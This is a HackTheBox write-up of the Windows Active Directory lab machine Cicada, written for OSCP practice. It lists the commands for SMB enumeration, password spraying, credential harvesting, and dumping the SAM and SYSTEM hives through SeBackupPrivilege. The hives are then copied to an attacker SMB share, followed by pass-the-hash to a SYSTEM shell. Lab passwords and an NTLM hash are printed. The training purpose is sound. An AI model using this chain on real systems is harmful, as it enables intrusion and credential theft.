+++
date = '2026-05-19T00:00:00-03:00'
draft = false
title = 'HTB: Cicada - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'active-directory', 'smb', 'password-spray', 'sebackupprivilege', 'pass-the-hash']
description = 'Write-up for the HackTheBox machine Cicada - a Windows AD box built around SMB enumeration, password spraying, credential leakage, and SeBackupPrivilege abuse.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-cicada/cover.png'
+++

Cicada is a textbook Active Directory enumeration chain. Each step surfaces something that unlocks the next user - a default password in an HR notice, a credential in a PowerShell script description field, a privilege that lets you dump the SAM. Good practice for the AD portion of OSCP.

## Machine info

| | |
|---|---|
| **Name** | Cicada |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Easy |

## TL;DR

- Anonymous SMB access exposes an HR onboarding notice with a **default password**
- Password spraying with nxc identifies **michael.wrightson** as the matching user
- Listing users without RID brute reveals **david.orelious** has his password in his description field
- David can access the DEV share, which contains a PowerShell script with **emily.oscars** credentials
- Emily has **SeBackupPrivilege** via WinRM - used to dump SAM/SYSTEM and pass-the-hash as Administrator

---

## Recon

### RustScan

```bash
rustscan -a 10.129.231.149
```

![RustScan output showing many open ports: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985](/images/htb-cicada/rustscan.png)

Classic Domain Controller port spread. Port 445 (SMB) and 5985 (WinRM) are the most interesting starting points.

---

## Enumeration

### Anonymous SMB - shares and HR notice

Listing shares without credentials to see what is exposed:

```bash
smbclient -L \\\\10.129.231.149\\ -N
```

![smbclient -L output showing ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL shares](/images/htb-cicada/smb-anonymous.png)

The **HR** share is readable without authentication.

```bash
smbclient \\\\10.129.231.149\\HR -N
```

![smb: \> ls showing "Notice from HR.txt" file](/images/htb-cicada/hr-share.png)

A file called "Notice from HR.txt". Let's read it.

![HR notice content: welcome email stating default password is Cicada$M6Corpb@Lp#nZp!8, asking users to change it](/images/htb-cicada/hr-notice.png)

A default password in an onboarding notice. The credential is: `Cicada$M6Corpb@Lp#nZp!8`. Now we need valid usernames to spray it against.

### User enumeration - RID brute with nxc

```bash
nxc smb 10.129.231.149 -u guest -p '' --rid-brute
```

![nxc rid-brute output listing cicada.htb domain users](/images/htb-cicada/rid-brute.png)

Five candidate users identified: `john.smoulders`, `sarah.dantelia`, `michael.wrightson`, `david.orelious`, `emily.oscars`.

### Password spraying

```bash
nxc smb 10.129.231.149 -u usersFiltered -p 'Cicada$M6Corpb@Lp#nZp!8'
```

![nxc spray result: john and sarah STATUS_LOGON_FAILURE, michael.wrightson Pwnd!](/images/htb-cicada/password-spray.png)

**michael.wrightson** hits. Michael does not have access to the DEV share, so enumeration continues.

### Listing users without RID brute - description field leak

Running a plain user enumeration (not RID-based) with Michael's credentials surfaces account descriptions:

![nxc user enum showing david.orelious with description containing a password](/images/htb-cicada/enum-users-description.png)

**david.orelious** has his password sitting in the description field: `aRt$Lp#7t*VQ!3`. A classic misconfiguration.

### David's access - DEV share

```bash
nxc smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![nxc shares output for david: DEV share has READ access, plus standard HR, NETLOGON, SYSVOL](/images/htb-cicada/david-shares.png)

David can read the **DEV** share. Time to see what is in there.

### Spider the shares with nxc spider_plus

```bash
nxc smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' -M spider_plus
```

![spider_plus module output showing share enumeration in progress, saved files metadata to JSON](/images/htb-cicada/spider-plus.png)

The module saves a JSON index of all share contents.

![cat of spider_plus JSON - DEV share contains Backup_script.ps1, 601 bytes](/images/htb-cicada/spider-plus-json.png)

One file in DEV: `Backup_script.ps1`.

### Backup_script.ps1 - emily.oscars credentials

```bash
smbclient \\\\10.129.231.149\\DEV -U david.orelious
smb: \> get Backup_script.ps1
```

![smbclient connecting to DEV as david, ls showing Backup_script.ps1, get downloading it](/images/htb-cicada/dev-share-download.png)

![cat Backup_script.ps1 showing $username = "emily.oscars" and $password = "Q!3@Lp#M6b*7t*Vt"](/images/htb-cicada/backup-script.png)

Hardcoded credentials in a PowerShell backup script. `emily.oscars:Q!3@Lp#M6b*7t*Vt`.

---

## Foothold

### WinRM access as emily.oscars

```bash
nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![nxc winrm result: Pwnd! for emily.oscars](/images/htb-cicada/nxc-winrm.png)

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i 10.129.231.149
```

![Evil-WinRM session established as emily.oscars at C:\Users\emily.oscars.CICADA\Documents>](/images/htb-cicada/evil-winrm.png)

![type Desktop\user.txt returning flag hash](/images/htb-cicada/user-flag.png)

---

## Privilege Escalation

### SeBackupPrivilege - dump SAM and SYSTEM

```bash
whoami /priv
```

![whoami /priv showing SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege all Enabled](/images/htb-cicada/sebackupprivilege.png)

`SeBackupPrivilege` is enabled, which allows reading any file regardless of ACL - including the SAM and SYSTEM hives.

```bash
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
```

![reg save commands completing successfully for both SAM and SYSTEM](/images/htb-cicada/reg-save.png)

Exfiltrate both files to Kali via an impacket SMB server:

```bash
copy C:\Windows\Temp\sam.bak \\10.10.14.208\share\
copy C:\Windows\Temp\system.bak \\10.10.14.208\share\
```

![copy commands sending sam.bak and system.bak to the attacker share](/images/htb-cicada/exfil-sam-system.png)

On Kali, start the SMB server before running the copies:

```bash
impacket-smbserver share . -smb2support
```

![impacket-smbserver starting, share "." with smb2support](/images/htb-cicada/smb-server.png)

### Extract hashes with secretsdump

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

![secretsdump output: Administrator NTLM hash 2b87e7c93a3e8a0ea4a581937016f341](/images/htb-cicada/secretsdump.png)

Administrator NTLM hash in hand.

### Pass the hash

```bash
nxc smb 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

![nxc pass-the-hash: Pwnd! for cicada.htb\Administrator](/images/htb-cicada/pass-the-hash.png)

```bash
impacket-psexec Administrator@10.129.231.149 -hashes :2b87e7c93a3e8a0ea4a581937016f341
```

![psexec shell as NT authority\system, type C:\Users\Administrator\Desktop\root.txt](/images/htb-cicada/psexec-root.png)

Root flag captured.

---

## Takeaways (for OSCP)

- **Check account description fields.** It is a five-second check during AD enumeration and it paid off here with David's password. nxc makes it trivial.
- **Spider shares systematically.** The `spider_plus` module saved navigating share by share manually and surfaced the PowerShell script immediately.
- **SeBackupPrivilege equals SAM dump.** Whenever you see this privilege enabled, `reg save` + secretsdump is a reliable path to the Administrator hash. Practice it until it is automatic.
- **Cascade your credentials.** Each user in this chain unlocked the next one. Keeping a credential matrix (user, source, tested-where) avoids losing track of what you have.

## References

- [HackTheBox - Cicada](https://app.hackthebox.com/machines/Cicada)
- [SeBackupPrivilege abuse - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups#sebackupprivilege)
- [nxc (NetExec) documentation](https://www.netexec.wiki/)
- Lain Kusanagi list (OSCP prep)
